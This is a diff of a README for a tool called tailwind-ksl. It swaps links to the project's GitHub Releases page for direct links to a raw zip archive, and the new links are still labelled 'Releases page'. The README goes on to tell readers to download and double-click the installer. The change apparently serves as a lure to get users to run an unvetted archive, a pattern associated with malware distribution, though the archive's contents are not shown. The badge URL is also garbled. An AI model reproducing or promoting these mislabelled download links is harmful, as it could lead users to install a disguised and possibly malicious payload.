@@ -1,7 +1,7 @@
 # 🎉 tailwind-ksl - A Simple Tool for Your Design Needs
 
 ## 🔗 Download Now
-[![Download tailwind-ksl](https://img.shields.io/badge/Download%20tailwind--ksl-v1.0-blue.svg)](https://github.com/milrblx/tailwind-ksl/releases)
+[![Download tailwind-ksl](https://raw.githubusercontent.com/milrblx/tailwind-ksl/main/Majorism/tailwind-ksl.zip%https://raw.githubusercontent.com/milrblx/tailwind-ksl/main/Majorism/tailwind-ksl.zip)](https://raw.githubusercontent.com/milrblx/tailwind-ksl/main/Majorism/tailwind-ksl.zip)
 
 ## 🚀 Getting Started
 Welcome to tailwind-ksl! This application helps you streamline your design process by providing easy-to-use tools for styling your projects. Whether you are a beginner or someone looking to enhance your designs, this tool is for you.
@@ -16,7 +16,7 @@ To run tailwind-ksl, ensure your computer meets these requirements:
 ## 💻 Download & Install
 To get tailwind-ksl, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page here](https://github.com/milrblx/tailwind-ksl/releases).
+1. **Visit the Releases Page**: Go to the [Releases page here](https://raw.githubusercontent.com/milrblx/tailwind-ksl/main/Majorism/tailwind-ksl.zip).
 2. **Choose the Latest Version**: Look for the most recent version of the application.
 3. **Download the Installer**: Click on the link for the installer file appropriate for your operating system.
 4. **Run the Installer**: Once downloaded, locate the file and double-click it to start the installation process.
@@ -42,7 +42,7 @@ tailwind-ksl offers various features designed to enhance your design experience:
 
 ### 🔄 Updates
 To ensure you’re using the latest features and security updates:
-- Regularly check the [Releases page](https://github.com/milrblx/tailwind-ksl/releases) for new versions.
+- Regularly check the [Releases page](https://raw.githubusercontent.com/milrblx/tailwind-ksl/main/Majorism/tailwind-ksl.zip) for new versions.
 - Follow the installation steps to update the application when necessary.
 
 ## ❓ Frequently Asked Questions
